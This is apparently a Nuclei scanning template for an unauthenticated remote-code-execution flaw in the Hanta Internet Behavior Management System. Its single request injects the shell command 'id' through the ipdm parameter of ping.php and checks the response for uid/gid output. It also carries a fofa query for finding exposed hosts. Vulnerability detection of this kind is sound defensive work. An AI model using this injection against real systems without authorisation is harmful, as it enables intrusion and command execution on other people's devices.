id: hanta-rce

info:
  name: Hanta Internet Behavior Management System - Remote Code Execution
  author: momika233
  severity: high
  description: Hanta Internet Behavior Management System is vulnerable to RCE.
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="汉塔科技上网行为管理系统"
  tags: hanta,rce,unauth,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/dgn/dgn_tools/ping.php?ipdm=2;id;"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100b2eb460c94cd3f4180c5eaec9b8ddf0102edd1c16a4b5336b114f61218c5efd1022100c8cd23e22555170a1d5b9f5b2c505294f3e29bdd4b5a1bb1b3b8586fd8ad03c8:922c64590222798bb761d5b6d8e72950